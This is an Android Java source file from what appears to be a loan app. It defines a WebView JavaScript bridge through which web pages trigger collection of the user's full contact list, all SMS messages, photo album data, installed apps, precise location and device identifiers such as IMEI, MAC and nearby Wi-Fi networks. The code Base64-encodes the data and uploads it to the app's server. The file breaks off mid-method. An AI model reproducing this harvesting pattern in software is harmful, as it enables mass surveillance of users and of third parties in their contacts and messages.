package com.grew.sw.cashlawn.web;

import static android.app.Activity.RESULT_OK;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebView;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;

import com.google.gson.Gson;
import com.grew.sw.cashlawn.App;
import com.grew.sw.cashlawn.model.AlbumInfoAuthModel;
import com.grew.sw.cashlawn.model.AlbumInfoModel;
import com.grew.sw.cashlawn.model.AppListInfoAuthModel;
import com.grew.sw.cashlawn.model.AppListInfoModel;
import com.grew.sw.cashlawn.model.AppsFlyerModel;
import com.grew.sw.cashlawn.model.AuthInfoModel;
import com.grew.sw.cashlawn.model.BatteryStatusData;
import com.grew.sw.cashlawn.model.ContactInfoAuthModel;
import com.grew.sw.cashlawn.model.ContactInfoBackModel;
import com.grew.sw.cashlawn.model.ContactInfoModel;
import com.grew.sw.cashlawn.model.DeviceInfoData;
import com.grew.sw.cashlawn.model.DeviceInfoModel;
import com.grew.sw.cashlawn.model.GeneralData;
import com.grew.sw.cashlawn.model.GpsLatLong;
import com.grew.sw.cashlawn.model.HardwareData;
import com.grew.sw.cashlawn.model.ImageResponse;
import com.grew.sw.cashlawn.model.JSCommonJSModel;
import com.grew.sw.cashlawn.model.JsBridgeCallBackModel;
import com.grew.sw.cashlawn.model.JsBridgeModel;
import com.grew.sw.cashlawn.model.LocationBean;
import com.grew.sw.cashlawn.model.PublicIpData;
import com.grew.sw.cashlawn.model.SmsInfoAuthModel;
import com.grew.sw.cashlawn.model.SmsInfoModel;
import com.grew.sw.cashlawn.model.StorageData;
import com.grew.sw.cashlawn.model.UserInfoResponse;
import com.grew.sw.cashlawn.network.NetCallback;
import com.grew.sw.cashlawn.network.NetClient;
import com.grew.sw.cashlawn.network.NetErrorModel;
import com.grew.sw.cashlawn.network.NetUpload;
import com.grew.sw.cashlawn.network.NetUtil;
import com.grew.sw.cashlawn.util.AuthDataUtil;
import com.grew.sw.cashlawn.util.ComUtil;
import com.grew.sw.cashlawn.util.ConsUtil;
import com.grew.sw.cashlawn.util.DateUtil;
import com.grew.sw.cashlawn.util.DeviceInfoUtil;
import com.grew.sw.cashlawn.util.DeviceUtils;
import com.grew.sw.cashlawn.util.FileUtil;
import com.grew.sw.cashlawn.util.IActivityManager;
import com.grew.sw.cashlawn.util.ImageDataUtil;
import com.grew.sw.cashlawn.util.LoadingUtil;
import com.grew.sw.cashlawn.util.LogUtils;
import com.grew.sw.cashlawn.util.SparedUtils;
import com.grew.sw.cashlawn.util.SpecialPermissionUtil;
import com.grew.sw.cashlawn.util.ToastUtils;
import com.grew.sw.cashlawn.util.UserInfoUtil;
import com.grew.sw.cashlawn.view.SignActivity;
import com.grew.sw.cashlawn.view.WebActivity;
import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.UnsupportedCharsetException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
import okio.Buffer;
import okio.BufferedSource;

public class WebJsBridge {
    private WebView mWebView;
    private Context mContext;
    private Handler mainHandler;
    private ImageDataUtil imageDataUtil;
    private JsBridgeModel selectContactJsBridgeModel;
    private JsBridgeModel tackPhotoJsBridgeModel;
    private File photoFile;
    private final static int REQUEST_SELECT_CONTACTS = 2323;
    private final static int REQUEST_TACK_PHOTO = 2324;
    private final String TAG = "WebJsBridge";
    public static final String APPUSERINFO = "appUserInfo";
    public static final String APPCOPYCLIP = "appCopyClip";
    public static final String APPSIGNOUT = "appSignOut";
    public static final String APPDEVICEINFO = "appDeviceInfo";
    public static final String APPINSTALLATIONINFO = "appInstallationInfo";
    public static final String APPLOCATIONINFO = "appLocationInfo";
    public static final String APPSMSINFO = "appSmsInfo";
    public static final String APPALBUMINFO = "appAlbumInfo";
    public static final String APPCONTACTINFO = "appContactInfo";
    public static final String APPSELECTCONTACT = "appSelectContact";
    public static final String APPCALLPHONE = "appCallPhone";
    public static final String APPAPPSFLYER = "appAppsFlyer";
    public static final String APPTACKPHOTO = "appTackPhoto";
    public static final String APPFORWARD = "appForward";
    public static final String APPSERVICETIME = "appServiceTime";


    public WebJsBridge(Context context, WebView webView) {
        mContext = context;
        mWebView = webView;
        mainHandler = new Handler(Looper.getMainLooper());
    }

    @JavascriptInterface
    public void appData(String json) {
        LogUtils.d( "----- appData :" + json);
        mWebView.post(() -> {
            try {
                JsBridgeModel jsBridgeModel = new Gson().fromJson(json, JsBridgeModel.class);
                switch (jsBridgeModel.getAppAction()) {
                    case APPUSERINFO:
                        //用户信息
                        getUserJson(jsBridgeModel);
                        break;
                    case APPCOPYCLIP:
                        //复制到剪贴版
                        copy(jsBridgeModel);
                        break;
                    case APPSIGNOUT:
                        //退出登录
                        logout(jsBridgeModel);
                        break;
                    case APPDEVICEINFO:
                        //设备信息
                        deviceInfo(jsBridgeModel);
                        break;
                    case APPINSTALLATIONINFO:
                        //安装信息
                        installAppList(jsBridgeModel);
                        break;
                    case APPLOCATIONINFO:
                        //定位信息
                        locationInfo(jsBridgeModel);
                        break;
                    case APPSMSINFO:
                        //短信信息
                        smsInfo(jsBridgeModel);
                        break;
                    case APPALBUMINFO:
                        //相册信息
                        albumInfo(jsBridgeModel);
                        break;
                    case APPCONTACTINFO:
                        //通讯录信息
                        contactInfo(jsBridgeModel);
                        break;
                    case APPSELECTCONTACT:
                        //选择通讯录
                        selectContact(jsBridgeModel);
                        break;
                    case APPCALLPHONE:
                        //拨打电话
                        callPhone(jsBridgeModel);
                        break;
                    case APPAPPSFLYER:
                        //埋点
                        appsFlyer(jsBridgeModel);
                        break;
                    case APPTACKPHOTO:
                        //拍照
                        tackPhoto(jsBridgeModel);
                        break;
                    case APPFORWARD:
                        //跳转新页面
                        openNewView(jsBridgeModel);
                        break;
                    case APPSERVICETIME:
                        //获取系统时间
                        appServiceTime(jsBridgeModel);
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

    }

    /**
     * 获取系统时间
     *
     * @param jsBridgeModel
     */
    private void appServiceTime(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            LogUtils.d("============时间："+jsCommonJSModel.getValue());
            DateUtil.initTime(jsCommonJSModel.getValue());
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }
    }

    /**
     * 开启新页面
     *
     * @param jsBridgeModel
     */
    private void openNewView(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            WebActivity.openWeb((Activity) mContext, false, jsCommonJSModel.getValue());
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }
    }

    /**
     * 拍照
     *
     * @param jsBridgeModel
     */
    private void tackPhoto(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.Group.STORAGE)
                .permission(Permission.CAMERA)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            tackPhotoJsBridgeModel = jsBridgeModel;
                            Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                            photoFile = new File(ComUtil.getImageDir(), DateUtil.getServerTimestamp() + ".jpg");
                            Uri mImageUri;
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                //兼容7.0以上
                                String authority = App.get().getPackageName() + ".provider";
                                mImageUri = FileProvider.getUriForFile(App.get(), authority, photoFile);
                            } else {
                                mImageUri = Uri.fromFile(photoFile);
                            }
                            takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mImageUri);
                            takePictureIntent.putExtra("android.intent.extra.USE_FRONT_CAMERA", true);
                            takePictureIntent.putExtra("android.intent.extras.CAMERA_FACING", 1);
                            takePictureIntent.putExtra("android.intent.extras.LENS_FACING_FRONT", 1);
                            ((Activity) mContext).startActivityForResult(takePictureIntent, REQUEST_TACK_PHOTO);
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 埋点
     *
     * @param jsBridgeModel
     */
    private void appsFlyer(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            AppsFlyerModel appsFlyerModel = new Gson().fromJson(jsonData.toString(), AppsFlyerModel.class);
            ComUtil.appsFlyer(appsFlyerModel.getEventName());
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), null);
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }

    }

    private void callPhone(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + jsCommonJSModel.getValue()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            mContext.startActivity(intent);
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), null);
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }
    }

    /**
     * 选择通讯录
     *
     * @param jsBridgeModel
     */
    private void selectContact(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_CONTACTS)
                .permission(Permission.GET_ACCOUNTS)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            selectContactJsBridgeModel = jsBridgeModel;
                            ((Activity) mContext).startActivityForResult(new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI), REQUEST_SELECT_CONTACTS);
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 通讯录信息
     *
     * @param jsBridgeModel
     */
    private void contactInfo(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_CONTACTS)
                .permission(Permission.GET_ACCOUNTS)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            new Thread(() -> {
                                ArrayList<ContactInfoModel> contactInfoModels = AuthDataUtil.getContactInfoModels();
                                ContactInfoAuthModel contactInfoAuthModel = new ContactInfoAuthModel();
                                contactInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
                                contactInfoAuthModel.setList(contactInfoModels);
                                LogUtils.d("通讯录信息：\n" + contactInfoAuthModel.toString());
                                pushAuthData(jsBridgeModel, contactInfoAuthModel, null, null, null, null, null);
                            }).start();
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 相册信息
     *
     * @param jsBridgeModel
     */
    private void albumInfo(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.Group.STORAGE)
                .permission(Permission.READ_PHONE_STATE)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            if (imageDataUtil == null) {
                                imageDataUtil = new ImageDataUtil();
                            }
                            imageDataUtil.start((AppCompatActivity) mContext, albumInfoModels -> {
                                imageDataUtil.unLoadedListener();
                                AlbumInfoAuthModel albumInfoAuthModel = new AlbumInfoAuthModel();
                                albumInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
                                albumInfoAuthModel.setList(albumInfoModels);

                                LogUtils.d("相册信息：\n" + albumInfoAuthModel.toString());
                                pushAuthData(jsBridgeModel, null, null, null, null, null, albumInfoAuthModel);
                            });
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 短信信息
     *
     * @param jsBridgeModel
     */
    private void smsInfo(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_PHONE_STATE)
                .permission(Permission.READ_SMS)
                .permission(Permission.READ_CONTACTS)
                .permission(Permission.GET_ACCOUNTS)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            new Thread(() -> {
                                ArrayList<SmsInfoModel> smsBeans = AuthDataUtil.getSmsInfo();

                                SmsInfoAuthModel smsInfoAuthModel = new SmsInfoAuthModel();
                                smsInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
                                smsInfoAuthModel.setList(smsBeans);
                                LogUtils.d("短信信息：\n" + smsInfoAuthModel.toString());

                                pushAuthData(jsBridgeModel, null, null, null, null, smsInfoAuthModel, null);
                            }).start();
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 位置信息
     *
     * @param jsBridgeModel
     */
    private void locationInfo(JsBridgeModel jsBridgeModel) {
        SpecialPermissionUtil.openLocService();
        XXPermissions.with(mContext)
                .permission(Permission.READ_PHONE_STATE)
                .permission(Permission.ACCESS_FINE_LOCATION)
                .permission(Permission.ACCESS_COARSE_LOCATION)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        ComUtil.initLocationListener();
                        if (all && SpecialPermissionUtil.isLocServiceEnable()) {
                            new Thread(() -> {
                                LocationManager locationManager = (LocationManager) App.get().getSystemService(Context.LOCATION_SERVICE);
                                if (locationManager == null) {
                                    callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                                    return;
                                }
                                Location location = ComUtil.getLastKnownLocation(locationManager);
                                if (location == null){
                                    LogUtils.d("未获取到定位，延迟后继续获取");
                                    try {
                                        Thread.sleep(5000);
                                    } catch (InterruptedException e) {
                                        e.printStackTrace();
                                    }
                                    location = ComUtil.getLastKnownLocation(locationManager);
                                }
                                LocationBean geoBean = new LocationBean();
                                geoBean.setCreate_time(DateUtil.getServerTimestamp()/1000);
                                GpsLatLong gpsLatLong = new GpsLatLong();
                                if (location != null) {
                                    gpsLatLong.setLatitude(location.getLatitude() + "");
                                    gpsLatLong.setLongitude(location.getLongitude() + "");
                                    try {
                                        Geocoder geocoder = new Geocoder(App.get(), Locale.getDefault());
                                        List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                                        if (addresses.size() > 0) {
                                            Address address = addresses.get(0);
                                            if (address != null) {
                                                LogUtils.d("地址："+address.toString());
                                                geoBean.setGps_address_province(address.getAdminArea());
                                                geoBean.setGps_address_city(address.getLocality());
                                                if (TextUtils.isEmpty(address.getFeatureName())){
                                                    address.setFeatureName(address.getAddressLine(0));
                                                }
                                                if (TextUtils.isEmpty(address.getFeatureName())){
                                                    address.setFeatureName(address.getSubAdminArea());
                                                }
                                                if (TextUtils.isEmpty(address.getFeatureName())){
                                                    address.setFeatureName(address.getThoroughfare());
                                                }
                                                if (TextUtils.isEmpty(address.getThoroughfare())) {
                                                    address.setThoroughfare(address.getFeatureName());
                                                }
                                                geoBean.setGps_address_street(address.getThoroughfare());
                                                geoBean.setGps_address_address(address.getFeatureName());
                                            }
                                        }
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }
                                geoBean.setGps(gpsLatLong);
                                LogUtils.d("位置信息：" + geoBean.toString());
                                pushAuthData(jsBridgeModel, null, null, null, geoBean, null, null);
                            }).start();
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });

    }

    /**
     * app安装信息
     *
     * @param jsBridgeModel
     */
    private void installAppList(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_PHONE_STATE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            new Thread(() -> {
                                try {
                                    ArrayList<AppListInfoModel> appListBeans = new ArrayList<>();
                                    List<PackageInfo> allApps = App.get().getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES & PackageManager.GET_SERVICES);
                                    if (allApps != null) {
                                        for (PackageInfo packageInfo : allApps) {
                                            AppListInfoModel appListBean = new AppListInfoModel();
                                            appListBean.setLast_update_time(packageInfo.lastUpdateTime);
                                            appListBean.setPackage_name(packageInfo.packageName);
                                            appListBean.setApp_name(packageInfo.applicationInfo.loadLabel(App.get().getPackageManager()).toString());
                                            appListBean.setVersion_name(packageInfo.versionName);
                                            appListBean.setVersion_code(packageInfo.versionCode + "");
                                            appListBean.setFirst_install_time(packageInfo.firstInstallTime);
                                            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                                                //非系统
                                                appListBean.setIs_system("1");
                                            } else {
                                                appListBean.setIs_system("2");
                                            }
                                            appListBeans.add(appListBean);
                                        }
                                    }
                                    AppListInfoAuthModel appListInfoAuthModel =new AppListInfoAuthModel();
                                    appListInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
                                    appListInfoAuthModel.setList(appListBeans);
                                    LogUtils.d("安装信息：\n" + appListInfoAuthModel.toString());
                                    pushAuthData(jsBridgeModel, null, null, appListInfoAuthModel, null, null, null);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                                }
                            }).start();
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });

    }

    /**
     * 设备信息
     *
     * @param jsBridgeModel
     */
    private void deviceInfo(JsBridgeModel jsBridgeModel) {
        SpecialPermissionUtil.openLocService();
        SpecialPermissionUtil.openWifi();
        XXPermissions.with(mContext)
                .permission(Permission.ACCESS_FINE_LOCATION)
                .permission(Permission.ACCESS_COARSE_LOCATION)
                .permission(Permission.READ_PHONE_STATE)
                .permission(Permission.Group.STORAGE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            if (!SpecialPermissionUtil.isLocServiceEnable() || !SpecialPermissionUtil.isOpenWifi()) {
                                callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                            } else {
                                new Thread() {
                                    @Override
                                    public void run() {
                                        LogUtils.d("开始延迟获取");
                                        try {
                                            Thread.sleep(2000);
                                        } catch (InterruptedException e) {
                                            e.printStackTrace();
                                        }
                                        LogUtils.d("----------开启获取数据");
                                        DeviceInfoModel deviceBean = new DeviceInfoModel();
                                        try {
                                            deviceBean.setWifi_state(DeviceInfoUtil.getCurrentNetworkRssi());
                                            deviceBean.setGaid(DeviceInfoUtil.getGAID());
                                            deviceBean.setBack_num(IActivityManager.back_num);
                                            deviceBean.setOpen_time(DateUtil.getTimeFromLongYMDHMS(App.getAppStartTime()));
                                            deviceBean.setOpen_power(App.open_power);
                                            deviceBean.setComplete_apply_power(App.complete_apply_power);

                                            deviceBean.setCreate_time(DateUtil.getServerTimestamp()/1000);
                                            deviceBean.setAudioExternal(FileUtil.getVideoExternalFiles().size());

                                            StorageData storageData = new StorageData();
                                            storageData.setAvailableMemory(DeviceInfoUtil.getAvailMemory()+"");
                                            storageData.setElapsedRealtime(SystemClock.elapsedRealtime());
                                            storageData.setMemorySize(DeviceInfoUtil.getTotalMemory());
                                            storageData.setIsUsingProxyPort(DeviceInfoUtil.isProxy());
                                            storageData.setIsUsingVPN(DeviceInfoUtil.isVpn());
                                            storageData.setRam_total_size(DeviceInfoUtil.getTotalMemory());
                                            storageData.setIsUSBDebug(DeviceInfoUtil.isUsbDebug());
                                            storageData.setAvailableDiskSize(DeviceInfoUtil.getAvailableSpace());
                                            storageData.setTotalDiskSize(DeviceInfoUtil.getTotalRam());
                                            deviceBean.setStorage(storageData);

                                            GeneralData generalData = new GeneralData();
                                            generalData.setPhone_type(DeviceInfoUtil.getPhoneType());
                                            generalData.setLanguage(App.get().getResources().getConfiguration().locale.getLanguage());
                                            generalData.setLocale_display_language(Locale.getDefault().toString());
                                            generalData.setNetwork_operator_name(DeviceInfoUtil.getOperatorName());
                                            generalData.setLocale_iso_3_country(App.get().getResources().getConfiguration().locale.getISO3Country());
                                            generalData.setLocale_iso_3_language(App.get().getResources().getConfiguration().locale.getISO3Language());
                                            deviceBean.setGeneral_data(generalData);

                                            HardwareData hardwareData=new HardwareData();
                                            hardwareData.setDevice_model(Build.MODEL);
                                            hardwareData.setImei(DeviceInfoUtil.getIMEI());
                                            hardwareData.setSys_version(Build.VERSION.SDK_INT+"");
                                            hardwareData.setScreenResolution(DeviceInfoUtil.getScreenResolution());
                                            hardwareData.setManufacturerName(Build.BRAND);
                                            deviceBean.setHardware(hardwareData);

                                            PublicIpData publicIpData = new PublicIpData();
                                            publicIpData.setFirst_ip(SparedUtils.getString(ConsUtil.KEY_PUBLIC_IP));
                                            deviceBean.setPublic_ip(publicIpData);

                                            BatteryStatusData batteryStatusData=new BatteryStatusData();
                                            batteryStatusData.setIs_usb_charge(SparedUtils.getInt(ConsUtil.KEY_BATTERY_IS_USB));
                                            batteryStatusData.setIs_ac_charge(SparedUtils.getInt(ConsUtil.KEY_BATTERY_IS_AC));
                                            batteryStatusData.setBatteryPercentage(SparedUtils.getString(ConsUtil.KEY_BATTERY_LEVEL));
                                            batteryStatusData.setBattery_temper(SparedUtils.getInt(ConsUtil.KEY_BATTERY_TEMPER)+"");
                                            batteryStatusData.setBattery_health(SparedUtils.getInt(ConsUtil.KEY_BATTERY_HEALTH)+"");
                                            batteryStatusData.setBatteryStatus(SparedUtils.getInt(ConsUtil.KEY_BATTERY_STATUS));
                                            deviceBean.setBattery_status(batteryStatusData);

                                            DeviceInfoData data=new DeviceInfoData();
                                            data.setIsRooted(DeviceUtils.isDeviceRooted() ?"true":"false");
                                            deviceBean.setDevice_info(data);

                                            deviceBean.setTime_zoneId(DeviceInfoUtil.getTimeZoneId());
                                            deviceBean.setKernel_version(DeviceInfoUtil.getKernelVersion());
                                            deviceBean.setCurrentSystemTime(System.currentTimeMillis()/1000+"");
                                            deviceBean.setAudioInternal(FileUtil.getAudioInternalFiles().size()+"");
                                            deviceBean.setNettype(DeviceInfoUtil.getNetworkState()+"");
                                            deviceBean.setSerial(Build.SERIAL);
                                            deviceBean.setAndroid_id(DeviceUtils.getAndroidID());
                                            deviceBean.setKernel_architecture(Build.CPU_ABI);
                                            deviceBean.setBuild_id(Build.ID);
                                            deviceBean.setImagesInternal(FileUtil.getImagesInternalFiles().size()+"");
                                            deviceBean.setBuild_number(Build.DISPLAY);
                                            deviceBean.setMac(DeviceUtils.getMacAddress());
                                            deviceBean.setBoard(Build.BOARD);
                                            deviceBean.setVideoInternal(FileUtil.getVideoInternalFiles().size());
                                            deviceBean.setAudioExternal(FileUtil.getAudioExternalFiles().size());
                                            deviceBean.setBuild_time(Build.TIME);
                                            deviceBean.setWifilist(DeviceInfoUtil.getWifiList());
                                            deviceBean.setSensorcount(DeviceInfoUtil.getSensorCount());
                                            deviceBean.setTime_zone(DeviceInfoUtil.getTimeZone());
                                            deviceBean.setRelease_date(Build.TIME);
                                            deviceBean.setDevice_name(DeviceInfoUtil.getDeviceName());
                                            deviceBean.setImagesExternal(FileUtil.getImagesExternalFiles().size()+"");
                                            deviceBean.setSecurity_patch_level(Build.VERSION.SECURITY_PATCH);
                                            deviceBean.setPhone_brand(Build.BRAND);
                                            deviceBean.setCur_wifi_mac(DeviceInfoUtil.getWifiInfo());
                                            deviceBean.setImei1(DeviceInfoUtil.getIMEI1());
                                            deviceBean.setImei2(DeviceInfoUtil.getIMEI1());
                                            deviceBean.setBuild_fingerprint(Build.FINGERPRINT);
                                            deviceBean.setCur_wifi_ssid(DeviceInfoUtil.getWifiName());
                                            deviceBean.setDownloadFiles(FileUtil.getDownloadFiles().size());
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                        LogUtils.d("设备信息：\n" + deviceBean.toString());
                                        pushAuthData(jsBridgeModel, null, deviceBean, null, null, null, null);
                                    }
                                }.start();
                            }
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 退出登录
     *
     * @param jsBridgeModel
     */
    private void logout(JsBridgeModel jsBridgeModel) {
        NetClient.getNewService().logout()
                .compose(NetUtil.applySchedulers())
                .doOnSubscribe(disposable -> LoadingUtil.show())
                .doFinally(() -> LoadingUtil.dismiss())
                .subscribe(new NetCallback() {
                    @Override
                    public void businessFail(NetErrorModel netErrorModel) {
                        ToastUtils.showShort(netErrorModel.getMessage());
                    }

                    @Override
                    public void businessSuccess(Object data) {
                        UserInfoUtil.logout();
                        Intent intent = new Intent(mContext, SignActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
                        mContext.startActivity(intent);
                    }
                });
    }

    /**
     * 复制
     *
     * @param jsBridgeModel
     */
    private void copy(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            ClipboardManager manager = (ClipboardManager) App.get().getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clipData = ClipData.newPlainText("", jsCommonJSModel.getValue());
            manager.setPrimaryClip(clipData);
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), null);
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "userInfo is null");
        }

    }

    /**
     * 获取用户信息
     *
     * @param jsBridgeModel
     */
    private void getUserJson(JsBridgeModel jsBridgeModel) {
        UserInfoResponse.Data userInfo = UserInfoUtil.getUserInfo();
        if (userInfo == null) {
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "userInfo is null");
        } else {
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), new Gson().toJson(userInfo));
        }
    }


    private void pushAuthData(JsBridgeModel models, ContactInfoAuthModel contactBeanList
            , DeviceInfoModel deviceBean
            , AppListInfoAuthModel appListBeanList, LocationBean geoBeanList, SmsInfoAuthModel smsBeanList
            , AlbumInfoAuthModel albumBeanList) {
        Map<String, String> map = new HashMap<>();
        AuthInfoModel authInfoModel = new AuthInfoModel(albumBeanList, appListBeanList, contactBeanList, smsBeanList, deviceBean, geoBeanList);
        String content = new Gson().toJson(authInfoModel);
        map.put("authInfo", Base64.encodeToString(content.getBytes(), Base64.DEFAULT));
        NetClient.getAuthService()
                .uploadCocoLoanWardAuth(map)
                .compose(NetUtil.applySchedulers())
                .subscribe(new NetCallback<UserInfoResponse>() {
                    @Override
                    public void businessFail(NetErrorModel netErrorModel) {
                        callJSFailNet(models.getAppAction(), models.getAppActionId(), netErrorModel.getMessage());
                    }

                    @Override
                    public void businessSuccess(UserInfoResponse data) {
